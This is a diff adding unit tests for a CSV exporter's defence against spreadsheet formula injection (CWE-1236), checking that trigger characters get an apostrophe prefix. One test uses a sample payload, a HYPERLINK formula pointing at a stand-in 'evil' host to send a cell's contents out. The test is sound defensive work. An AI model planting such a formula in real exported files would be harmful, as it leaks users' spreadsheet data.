@@ -251,3 +251,36 @@ describe('toCsv — correct quoting (symmetric with parseCsv)', () => {
     expect(parseCsv(csv)[1][0]).toBe(value);
   });
 });
+
+describe('toCsv — formula-injection neutralization (CWE-1236)', () => {
+  it('prefixes a leading "=" with an apostrophe so spreadsheets treat it as text', () => {
+    const csv = toCsv([{ ID: '=1+1', Group: 'A' }], ['ID', 'Group']);
+    expect(csv).toBe("ID,Group\n'=1+1,A");
+  });
+
+  it('neutralizes the other trigger characters: +, -, @, tab, CR', () => {
+    const csv = toCsv(
+      [{ a: '+SUM(A1)', b: '-2+3', c: '@cmd', d: '\tx', e: '\rx' }],
+      ['a', 'b', 'c', 'd', 'e']
+    );
+    expect(csv).toBe("a,b,c,d,e\n'+SUM(A1),'-2+3,'@cmd,'\tx,\"'\rx\"");
+  });
+
+  it('neutralizes a formula payload while keeping RFC-4180 quoting intact', () => {
+    const payload = '=HYPERLINK("http://evil/?d="&A1,"click")';
+    const csv = toCsv([{ Group: payload }], ['Group']);
+    expect(csv).toBe(`Group\n"'=HYPERLINK(""http://evil/?d=""&A1,""click"")"`);
+    // The apostrophe prefix survives a round-trip; the payload never reappears bare.
+    expect(parseCsv(csv)[1][0]).toBe(`'${payload}`);
+  });
+
+  it('leaves plain negative numbers untouched (LGR column must stay numeric)', () => {
+    const csv = toCsv([{ 'LGR (%/y)': '-1.23' }], ['LGR (%/y)']);
+    expect(csv).toBe('LGR (%/y)\n-1.23');
+  });
+
+  it('leaves ordinary values and empty cells untouched', () => {
+    const csv = toCsv([{ ID: 'P001', Group: '' }], ['ID', 'Group']);
+    expect(csv).toBe('ID,Group\nP001,');
+  });
+});
